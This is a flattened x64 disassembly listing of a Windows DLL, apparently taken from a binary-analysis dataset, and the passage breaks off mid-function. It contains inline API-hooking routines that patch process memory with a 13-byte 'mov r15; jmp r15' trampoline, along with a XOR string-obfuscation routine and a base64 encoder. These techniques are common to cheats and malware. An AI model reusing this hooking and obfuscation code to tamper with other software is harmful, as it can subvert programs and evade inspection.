sub_180001000
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rax [ rsp + 0x30 ]
mov [ rax + 0x2c ] 0x0
mov rax [ rsp + 0x30 ]
mov [ rax ] 0x0
mov rax [ rsp + 0x30 ]
mov [ rax + 0x8 ] 0x0
mov rax [ rsp + 0x30 ]
mov [ rax + 0x30 ] 0x0
mov rax [ rsp + 0x30 ]
add rax 0x10
mov r8d 0xd
xor edx edx
mov rcx rax
call sub_1800059c0
mov rax [ rsp + 0x30 ]
add rax 0x1d
mov r8d 0xd
xor edx edx
mov rcx rax
call sub_1800059c0
mov rax [ rsp + 0x30 ]
add rax 0x38
mov rcx rax
call [ InitializeCriticalSection@IAT ]
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_1800010d0
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x40
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
add rsp 0x48
retn
mov rax [ rsp + 0x50 ]
add rax 0x1d
mov [ rsp + 0x20 ] 0x0
mov r9d 0xd
mov r8 rax
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ WriteProcessMemory@IAT ]
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ FlushInstructionCache@IAT ]
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d [ rsp + 0x30 ]
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ VirtualProtectEx@IAT ]
sub_180001190
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x40
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
add rsp 0x48
retn
mov rax [ rsp + 0x50 ]
add rax 0x10
mov [ rsp + 0x20 ] 0x0
mov r9d 0xd
mov r8 rax
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ WriteProcessMemory@IAT ]
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ FlushInstructionCache@IAT ]
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d [ rsp + 0x30 ]
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ VirtualProtectEx@IAT ]
sub_180001250
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x58 ]
mov [ rax + 0x8 ] rcx
call [ GetCurrentProcess@IAT ]
mov rcx [ rsp + 0x50 ]
mov [ rcx ] rax
mov rax [ rsp + 0x50 ]
cmp [ rax ] 0x0
jne r-xdata
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x40
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov rax [ rsp + 0x50 ]
add rax 0x10
mov [ rsp + 0x20 ] 0x0
mov r9d 0xd
mov r8 rax
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
add rsp 0x48
retn
mov rax [ rsp + 0x50 ]
mov [ rax + 0x1d ] 0x49
mov rax [ rsp + 0x50 ]
mov [ rax + 0x1e ] 0xbf
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x60 ]
mov [ rax + 0x1f ] rcx
mov rax [ rsp + 0x50 ]
mov [ rax + 0x27 ] 0x41
mov rax [ rsp + 0x50 ]
mov [ rax + 0x28 ] 0xff
mov rax [ rsp + 0x50 ]
mov [ rax + 0x29 ] 0xe7
mov rax [ rsp + 0x50 ]
add rax 0x1d
mov [ rsp + 0x20 ] 0x0
mov r9d 0xd
mov r8 rax
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ WriteProcessMemory@IAT ]
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ FlushInstructionCache@IAT ]
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d [ rsp + 0x30 ]
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
sub_1800013d0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
mov rcx [ rsp + 0x58 ]
call [ GetModuleHandleW@IAT ]
mov rcx [ rsp + 0x50 ]
mov [ rcx + 0x30 ] rax
mov rax [ rsp + 0x50 ]
cmp [ rax + 0x30 ] 0x0
jne r-xdata
mov rdx [ rsp + 0x60 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax + 0x30 ]
call [ GetProcAddress@IAT ]
mov rcx [ rsp + 0x50 ]
mov [ rcx + 0x8 ] rax
mov rax [ rsp + 0x50 ]
cmp [ rax + 0x8 ] 0x0
jne r-xdata
mov rcx [ rsp + 0x58 ]
call [ LoadLibraryW@IAT ]
mov rcx [ rsp + 0x50 ]
mov [ rcx + 0x30 ] rax
mov rax [ rsp + 0x50 ]
cmp [ rax + 0x30 ] 0x0
jne r-xdata
call [ GetCurrentProcess@IAT ]
mov rcx [ rsp + 0x50 ]
mov [ rcx ] rax
mov rax [ rsp + 0x50 ]
cmp [ rax ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x50 ]
mov [ rax + 0x2c ] 0x1
xor eax eax
jmp r-xdata
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x40
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add rsp 0x48
retn
xor eax eax
mov rax [ rsp + 0x50 ]
add rax 0x10
mov [ rsp + 0x20 ] 0x0
mov r9d 0xd
mov r8 rax
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
mov rax [ rsp + 0x50 ]
mov [ rax + 0x1d ] 0x49
mov rax [ rsp + 0x50 ]
mov [ rax + 0x1e ] 0xbf
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x68 ]
mov [ rax + 0x1f ] rcx
mov rax [ rsp + 0x50 ]
mov [ rax + 0x27 ] 0x41
mov rax [ rsp + 0x50 ]
mov [ rax + 0x28 ] 0xff
mov rax [ rsp + 0x50 ]
mov [ rax + 0x29 ] 0xe7
mov rax [ rsp + 0x50 ]
add rax 0x1d
mov [ rsp + 0x20 ] 0x0
mov r9d 0xd
mov r8 rax
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ WriteProcessMemory@IAT ]
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ FlushInstructionCache@IAT ]
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d [ rsp + 0x30 ]
mov r8d 0xd
mov rax [ rsp + 0x50 ]
mov rdx [ rax + 0x8 ]
mov rax [ rsp + 0x50 ]
mov rcx [ rax ]
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
sub_180001640
push rsi
push rdi
sub rsp 0xe8
call [ AllocConsole@IAT ]
mov ecx 0xfffffff5
call [ GetStdHandle@IAT ]
lea rdx [ rsp + 0x28 ]
mov rcx rax
call [ GetConsoleScreenBufferInfo@IAT ]
mov [ rsp + 0x2a ] 0x1f4
mov ecx 0xfffffff5
call [ GetStdHandle@IAT ]
mov edx [ rsp + 0x28 ]
mov rcx rax
call [ SetConsoleScreenBufferSize@IAT ]
mov ecx 0xfffffff5
call [ GetStdHandle@IAT ]
mov [ rsp + 0x20 ] rax
mov edx 0x4000
mov rcx [ rsp + 0x20 ]
call sub_180006770
mov [ rsp + 0x48 ] eax
lea rdx [ r--data ]
mov ecx [ rsp + 0x48 ]
call sub_180005eb0
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0xb0 ]
mov rdi rax
mov rsi [ rsp + 0x40 ]
mov ecx 0x30
[ rdi ] [ rsi ]
call sub_180005c50
lea rcx [ rsp + 0xb0 ]
lea rdi [ rax + 0x30 ]
mov rsi rcx
mov ecx 0x30
[ rdi ] [ rsi ]
call sub_180005c50
add rax 0x30
xor r9d r9d
mov r8d 0x4
xor edx edx
mov rcx rax
call sub_180005ab0
mov ecx 0xfffffff6
call [ GetStdHandle@IAT ]
mov [ rsp + 0x20 ] rax
mov edx 0x4000
mov rcx [ rsp + 0x20 ]
call sub_180006770
mov [ rsp + 0x48 ] eax
lea rdx [ r--data ]
mov ecx [ rsp + 0x48 ]
call sub_180005eb0
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x80 ]
mov rdi rax
mov rsi [ rsp + 0x40 ]
mov ecx 0x30
[ rdi ] [ rsi ]
call sub_180005c50
lea rcx [ rsp + 0x80 ]
mov rdi rax
mov rsi rcx
mov ecx 0x30
[ rdi ] [ rsi ]
call sub_180005c50
xor r9d r9d
mov r8d 0x4
xor edx edx
mov rcx rax
call sub_180005ab0
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
mov [ rsp + 0x20 ] rax
mov edx 0x4000
mov rcx [ rsp + 0x20 ]
call sub_180006770
mov [ rsp + 0x48 ] eax
lea rdx [ r--data ]
mov ecx [ rsp + 0x48 ]
call sub_180005eb0
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x50 ]
mov rdi rax
mov rsi [ rsp + 0x40 ]
mov ecx 0x30
[ rdi ] [ rsi ]
call sub_180005c50
lea rcx [ rsp + 0x50 ]
lea rdi [ rax + 0x60 ]
mov rsi rcx
mov ecx 0x30
[ rdi ] [ rsi ]
call sub_180005c50
add rax 0x60
xor r9d r9d
mov r8d 0x4
xor edx edx
mov rcx rax
call sub_180005ab0
mov cl 0x1
call sub_1800018a0
add rsp 0xe8
pop rdi
pop rsi
retn
sub_180001830
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rax [ rsp + 0x30 ]
movzx eax [ rax ]
cmp eax 0x1
jne r-xdata
call [ AllocConsole@IAT ]
call sub_180001640
mov rax [ rsp + 0x30 ]
mov [ rax ] 0x1
jmp r-xdata
add rsp 0x28
retn
sub_1800018a0
mov [ rsp + 0x8 ] cl
sub rsp 0x38
mov edx 0x2
lea rcx [ rsp + 0x24 ]
call sub_1800054d0
movzx eax [ rw-data ]
mov [ rsp + 0x20 ] al
movzx eax [ rsp + 0x40 ]
mov [ rw-data ] al
movzx eax [ rsp + 0x20 ]
mov [ rsp + 0x28 ] al
lea rcx [ rsp + 0x24 ]
call sub_180005500
mov al [ rsp + 0x28 ]
add rsp 0x38
retn
sub_1800018f0
mov [ rsp + 0x10 ] edx
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov [ rsp ] 0x0
movzx eax [ rsp + 0x28 ]
mov [ rsp ] al
mov eax [ rsp + 0x28 ]
sub eax 0x1
mov [ rsp + 0x4 ] eax
add rsp 0x18
retn
movsxd rax [ rsp + 0x4 ]
movsx ecx [ rsp ]
mov rdx [ rsp + 0x20 ]
movsx eax [ rdx + rax ]
xor eax ecx
movsxd rcx [ rsp + 0x4 ]
mov rdx [ rsp + 0x20 ]
mov [ rdx + rcx ] al
mov eax [ rsp + 0x4 ]
imul eax eax 0xb
mov ecx [ rsp + 0x4 ]
and ecx 0xf
add ecx 0x55
xor eax ecx
xor eax 0xaa
movsx ecx [ rsp ]
xor ecx eax
mov eax ecx
mov [ rsp ] al
mov eax [ rsp + 0x4 ]
sub eax 0x1
mov [ rsp + 0x4 ] eax
jmp r-xdata
cmp [ rsp + 0x4 ] 0x0
jl r-xdata
sub_180001980
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0xb8
mov [ rsp + 0x98 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov [ rsp + 0x90 ] 0x0
mov [ rsp + 0x38 ] 0x0
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x0
mov r9d 0xffffffff
mov r8 [ rsp + 0xc8 ]
xor edx edx
xor ecx ecx
call [ WideCharToMultiByte@IAT ]
mov [ rsp + 0x78 ] eax
cmp [ rsp + 0x78 ] 0x0
jg r-xdata
movsxd rax [ rsp + 0x78 ]
mov rcx rax
call j_sub_1800074e0
mov [ rsp + 0x80 ] rax
mov rax [ rsp + 0x80 ]
mov [ rsp + 0x40 ] rax
cmp [ rsp + 0x40 ] 0x0
jne r-xdata
lea rdx [ r--data ]
mov rcx [ rsp + 0xc0 ]
call sub_1800033a0
nop
mov eax [ rsp + 0x90 ]
or eax 0x1
mov [ rsp + 0x90 ] eax
mov rax [ rsp + 0xc0 ]
jmp r-xdata
mov [ rsp + 0x38 ] 0x0
mov [ rsp + 0x30 ] 0x0
mov eax [ rsp + 0x78 ]
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x40 ]
mov [ rsp + 0x20 ] rax
mov r9d 0xffffffff
mov r8 [ rsp + 0xc8 ]
xor edx edx
xor ecx ecx
call [ WideCharToMultiByte@IAT ]
mov eax [ rsp + 0x78 ]
sub eax 0x1
cdqe
mov rcx [ rsp + 0x40 ]
mov [ rcx + rax ] 0x0
mov rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_1800033a0
nop
mov rax [ rsp + 0x40 ]
mov [ rsp + 0x88 ] rax
mov rcx [ rsp + 0x88 ]
call j_sub_1800085f0
lea rdx [ rsp + 0x50 ]
mov rcx [ rsp + 0xc0 ]
call sub_180003400
mov eax [ rsp + 0x90 ]
or eax 0x1
mov [ rsp + 0x90 ] eax
lea rcx [ rsp + 0x50 ]
call sub_180003450
mov rax [ rsp + 0xc0 ]
lea rdx [ r--data ]
mov rcx [ rsp + 0xc0 ]
call sub_1800033a0
nop
mov eax [ rsp + 0x90 ]
or eax 0x1
mov [ rsp + 0x90 ] eax
mov rax [ rsp + 0xc0 ]
jmp r-xdata
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180006970
add rsp 0xb8
retn
sub_180001b60
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x90 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x90 ] 0xfffffffe
mov rcx [ rbp + 0xc0 ]
call sub_180003450
sub_180001bb0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov [ rsp + 0x20 ] 0x0
mov rcx [ rsp + 0x48 ]
call sub_180002840
mov rdx rax
mov rcx [ rsp + 0x40 ]
call sub_180001980
mov eax [ rsp + 0x20 ]
or eax 0x1
mov [ rsp + 0x20 ] eax
mov rax [ rsp + 0x40 ]
add rsp 0x38
retn
sub_180001c00
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0xb8
mov [ rsp + 0x90 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov [ rsp + 0x88 ] 0x0
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x0
mov r9d [ rsp + 0xd0 ]
mov r8 [ rsp + 0xc8 ]
xor edx edx
xor ecx ecx
call [ MultiByteToWideChar@IAT ]
cdqe
mov [ rsp + 0x38 ] rax
cmp [ rsp + 0x38 ] 0x0
ja r-xdata
mov rax [ rsp + 0x38 ]
add rax 0x1
mov [ rsp + 0x98 ] rax
mov eax 0x2
mov rcx [ rsp + 0x98 ]
mul rcx
mov rcx 0xffffffffffffffff
cmovo rax rcx
mov rcx rax
call j_sub_1800074e0
mov [ rsp + 0x78 ] rax
mov rax [ rsp + 0x78 ]
mov [ rsp + 0x30 ] rax
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
xor edx edx
mov rcx [ rsp + 0xc0 ]
call sub_180002740
nop
mov eax [ rsp + 0x88 ]
or eax 0x1
mov [ rsp + 0x88 ] eax
mov rax [ rsp + 0xc0 ]
jmp r-xdata
mov eax [ rsp + 0x38 ]
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d [ rsp + 0xd0 ]
mov r8 [ rsp + 0xc8 ]
xor edx edx
xor ecx ecx
call [ MultiByteToWideChar@IAT ]
mov rax [ rsp + 0x30 ]
mov rcx [ rsp + 0x38 ]
mov [ rax + rcx * 2 ] 0x0
mov rax [ rsp + 0x30 ]
movzx eax [ rax ]
cmp eax 0xfeff
jne r-xdata
xor edx edx
mov rcx [ rsp + 0xc0 ]
call sub_180002740
nop
mov eax [ rsp + 0x88 ]
or eax 0x1
mov [ rsp + 0x88 ] eax
mov rax [ rsp + 0xc0 ]
jmp r-xdata
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180006970
add rsp 0xb8
retn
mov rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x48 ]
call sub_180002740
nop
mov rax [ rsp + 0x30 ]
mov [ rsp + 0x80 ] rax
mov rcx [ rsp + 0x80 ]
call j_sub_1800085f0#2
lea rdx [ rsp + 0x48 ]
mov rcx [ rsp + 0xc0 ]
call sub_1800027a0
mov eax [ rsp + 0x88 ]
or eax 0x1
mov [ rsp + 0x88 ] eax
lea rcx [ rsp + 0x48 ]
call sub_1800027f0
mov rax [ rsp + 0xc0 ]
mov [ rsp + 0x70 ] 0x0
jmp r-xdata
movsxd rax [ rsp + 0x70 ]
cmp rax [ rsp + 0x38 ]
jae r-xdata
mov eax [ rsp + 0x70 ]
add eax 0x1
cdqe
movsxd rcx [ rsp + 0x70 ]
mov rdx [ rsp + 0x30 ]
mov r8 [ rsp + 0x30 ]
movzx eax [ r8 + rax * 2 ]
mov [ rdx + rcx * 2 ] ax
jmp r-xdata
mov eax [ rsp + 0x70 ]
add eax 0x1
mov [ rsp + 0x70 ] eax
sub_180001e30
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x88 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x88 ] 0xfffffffe
mov rcx [ rbp + 0xc0 ]
call sub_1800027f0
sub_180001e80
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov [ rsp + 0x20 ] 0x0
mov rcx [ rsp + 0x48 ]
call sub_1800035a0
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x48 ]
call sub_180003470
mov rcx [ rsp + 0x28 ]
mov r8 rcx
mov rdx rax
mov rcx [ rsp + 0x40 ]
call sub_180001c00
mov eax [ rsp + 0x20 ]
or eax 0x1
mov [ rsp + 0x20 ] eax
mov rax [ rsp + 0x40 ]
add rsp 0x38
retn
sub_180001ee0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0xe8
mov [ rsp + 0xb0 ] 0xfffffffffffffffe
mov [ rsp + 0x20 ] 0x0
mov [ rsp + 0x28 ] 0x0
mov rcx [ rsp + 0xf0 ]
call sub_1800035a0
lea rax [ rax + rax + 0x2 ]
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x28 ]
call j_sub_1800074e0
mov [ rsp + 0x40 ] rax
mov rax [ rsp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov r8 [ rsp + 0x28 ]
xor edx edx
mov rcx [ rsp + 0x30 ]
call sub_1800059c0
mov rcx [ rsp + 0x28 ]
call j_sub_1800074e0
mov [ rsp + 0x48 ] rax
mov rax [ rsp + 0x48 ]
mov [ rsp + 0x38 ] rax
mov r8 [ rsp + 0x28 ]
xor edx edx
mov rcx [ rsp + 0x38 ]
call sub_1800059c0
mov rdx [ rsp + 0xf0 ]
lea rcx [ rsp + 0x50 ]
call sub_180001bb0
mov [ rsp + 0xb8 ] rax
mov rax [ rsp + 0xb8 ]
mov [ rsp + 0xc0 ] rax
mov rcx [ rsp + 0xc0 ]
call sub_180003470
mov r8 rax
mov rdx [ rsp + 0x28 ]
mov rcx [ rsp + 0x30 ]
call sub_180007260
nop
lea rcx [ rsp + 0x50 ]
call sub_180003450
mov rcx [ rsp + 0x30 ]
call sub_1800071b0
mov edx eax
mov rcx [ rsp + 0x30 ]
call sub_1800018f0
mov rcx [ rsp + 0x30 ]
call sub_1800071b0
lea r8 [ rsp + 0x38 ]
mov edx eax
mov rcx [ rsp + 0x30 ]
call sub_1800022c0
cdqe
mov [ rsp + 0x20 ] rax
mov r8 [ rsp + 0x20 ]
mov rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x78 ]
call sub_180001c00
mov [ rsp + 0xc8 ] rax
mov rax [ rsp + 0xc8 ]
mov [ rsp + 0xd0 ] rax
mov rdx [ rsp + 0xd0 ]
mov rcx [ rsp + 0xf8 ]
call sub_180002810
nop
lea rcx [ rsp + 0x78 ]
call sub_1800027f0
mov rax [ rsp + 0x30 ]
mov [ rsp + 0xa0 ] rax
mov rcx [ rsp + 0xa0 ]
call j_sub_1800085f0
mov rax [ rsp + 0x38 ]
mov [ rsp + 0xa8 ] rax
mov rcx [ rsp + 0xa8 ]
call j_sub_1800085f0
mov eax [ rsp + 0x20 ]
add rsp 0xe8
retn
sub_1800020e0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0xe8
mov [ rsp + 0xb0 ] 0xfffffffffffffffe
mov [ rsp + 0x20 ] 0x0
mov [ rsp + 0x28 ] 0x0
mov rcx [ rsp + 0xf0 ]
call sub_1800035a0
lea rax [ rax + rax + 0x2 ]
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x28 ]
call j_sub_1800074e0
mov [ rsp + 0x40 ] rax
mov rax [ rsp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov r8 [ rsp + 0x28 ]
xor edx edx
mov rcx [ rsp + 0x30 ]
call sub_1800059c0
mov rcx [ rsp + 0x28 ]
call j_sub_1800074e0
mov [ rsp + 0x48 ] rax
mov rax [ rsp + 0x48 ]
mov [ rsp + 0x38 ] rax
mov r8 [ rsp + 0x28 ]
xor edx edx
mov rcx [ rsp + 0x38 ]
call sub_1800059c0
mov rdx [ rsp + 0xf0 ]
lea rcx [ rsp + 0x50 ]
call sub_180001bb0
mov [ rsp + 0xb8 ] rax
mov rax [ rsp + 0xb8 ]
mov [ rsp + 0xc0 ] rax
mov rcx [ rsp + 0xc0 ]
call sub_180003470
mov r8 rax
mov rdx [ rsp + 0x28 ]
mov rcx [ rsp + 0x30 ]
call sub_180007260
nop
lea rcx [ rsp + 0x50 ]
call sub_180003450
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_1800024c0
cdqe
mov [ rsp + 0x20 ] rax
mov edx [ rsp + 0x20 ]
mov rcx [ rsp + 0x38 ]
call sub_1800018f0
mov r8 [ rsp + 0x20 ]
mov rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x78 ]
call sub_180001c00
mov [ rsp + 0xc8 ] rax
mov rax [ rsp + 0xc8 ]
mov [ rsp + 0xd0 ] rax
mov rdx [ rsp + 0xd0 ]
mov rcx [ rsp + 0xf8 ]
call sub_180002810
nop
lea rcx [ rsp + 0x78 ]
call sub_1800027f0
mov rax [ rsp + 0x30 ]
mov [ rsp + 0xa0 ] rax
mov rcx [ rsp + 0xa0 ]
call j_sub_1800085f0
mov rax [ rsp + 0x38 ]
mov [ rsp + 0xa8 ] rax
mov rcx [ rsp + 0xa8 ]
call j_sub_1800085f0
mov eax [ rsp + 0x20 ]
add rsp 0xe8
retn
sub_1800022c0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] edx
mov [ rsp + 0x8 ] rcx
sub rsp 0x58
mov eax [ rsp + 0x68 ]
shl eax 0x2
cdq
mov ecx 0x3
idiv ecx
add eax 0x4
cdqe
mov rcx rax
call sub_180007310
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
cmp [ rsp + 0x20 ] 0x0
jne r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x28 ] 0x0
mov eax 0xffffffff
jmp r-xdata
mov rax [ rsp + 0x20 ]
mov [ rax ] 0x0
mov rax [ rsp + 0x70 ]
mov rcx [ rsp + 0x30 ]
mov [ rax ] rcx
mov rcx [ rsp + 0x30 ]
call sub_1800071b0
movsxd rax [ rsp + 0x28 ]
mov rcx [ rsp + 0x38 ]
movzx eax [ rcx + rax ]
mov [ rsp + 0x40 ] eax
mov eax [ rsp + 0x28 ]
add eax 0x1
mov [ rsp + 0x28 ] eax
mov eax [ rsp + 0x40 ]
imul eax eax 0x100
mov [ rsp + 0x40 ] eax
mov eax [ rsp + 0x68 ]
cmp [ rsp + 0x28 ] eax
jge r-xdata
add rsp 0x58
retn
mov eax [ rsp + 0x28 ]
add eax 0x1
mov [ rsp + 0x28 ] eax
mov eax [ rsp + 0x40 ]
imul eax eax 0x100
mov [ rsp + 0x40 ] eax
mov eax [ rsp + 0x68 ]
cmp [ rsp + 0x28 ] eax
jge r-xdata
movsxd rax [ rsp + 0x28 ]
mov rcx [ rsp + 0x38 ]
movzx eax [ rcx + rax ]
mov ecx [ rsp + 0x40 ]
add ecx eax
mov eax ecx
mov [ rsp + 0x40 ] eax
mov eax [ rsp + 0x28 ]
add eax 0x1
mov [ rsp + 0x28 ] eax
mov eax [ rsp + 0x40 ]
and eax 0xfc0000
sar eax 0x12
cdqe
lea rcx [ rw-data ]
mov rdx [ rsp + 0x20 ]
movzx eax [ rcx + rax ]
mov [ rdx ] al
mov eax [ rsp + 0x40 ]
and eax 0x3f000
sar eax 0xc
cdqe
lea rcx [ rw-data ]
mov rdx [ rsp + 0x20 ]
movzx eax [ rcx + rax ]
mov [ rdx + 0x1 ] al
mov eax [ rsp + 0x40 ]
and eax 0xfc0
sar eax 0x6
cdqe
lea rcx [ rw-data ]
mov rdx [ rsp + 0x20 ]
movzx eax [ rcx + rax ]
mov [ rdx + 0x2 ] al
mov eax [ rsp + 0x40 ]
and eax 0x3f
cdqe
lea rcx [ rw-data ]
mov rdx [ rsp + 0x20 ]
movzx eax [ rcx + rax ]
mov [ rdx + 0x3 ] al
mov eax [ rsp + 0x68 ]
cmp [ rsp + 0x28 ] eax
jle r-xdata
movsxd rax [ rsp + 0x28 ]
mov rcx [ rsp + 0x38 ]
movzx eax [ rcx + rax ]
mov ecx [ rsp + 0x40 ]
add ecx eax
mov eax ecx
mov [ rsp + 0x40 ] eax
mov eax [ rsp + 0x68 ]
add eax 0x1
cmp [ rsp + 0x28 ] eax
jle r-xdata
mov rax [ rsp + 0x20 ]
mov [ rax + 0x3 ] 0x3d
mov rax [ rsp + 0x20 ]
add rax 0x4
mov [ rsp + 0x20 ] rax
jmp r-xdata
mov rax [ rsp + 0x20 ]
mov [ rax + 0x2 ] 0x3d
mov eax [ rsp + 0x68 ]
cmp [ rsp + 0x28 ] eax
jge r-xdata
sub_1800024c0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
mov rax [ rsp + 0x58 ]
mov [ rsp + 0x28 ] rax
mov rax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] rax
jmp r-xdata
mov rax [ rsp + 0x20 ]
movsx eax [ rax ]
test eax eax
je r-xdata
mov rax [ rsp + 0x58 ]
mov rcx [ rsp + 0x28 ]
sub rcx rax
mov rax rcx
mov rax [ rsp + 0x20 ]
movsx eax [ rax ]
cmp eax 0x3d
je r-xdata
mov rcx [ rsp + 0x20 ]
call sub_1800025f0
mov [ rsp + 0x34 ] eax
mov eax [ rsp + 0x34 ]
shr eax 0x18
and eax 0xff
mov [ rsp + 0x30 ] eax
cmp [ rsp + 0x34 ] 0xffffffff
jne r-xdata
mov rax [ rsp + 0x20 ]
movsx eax [ rax ]
mov edx eax
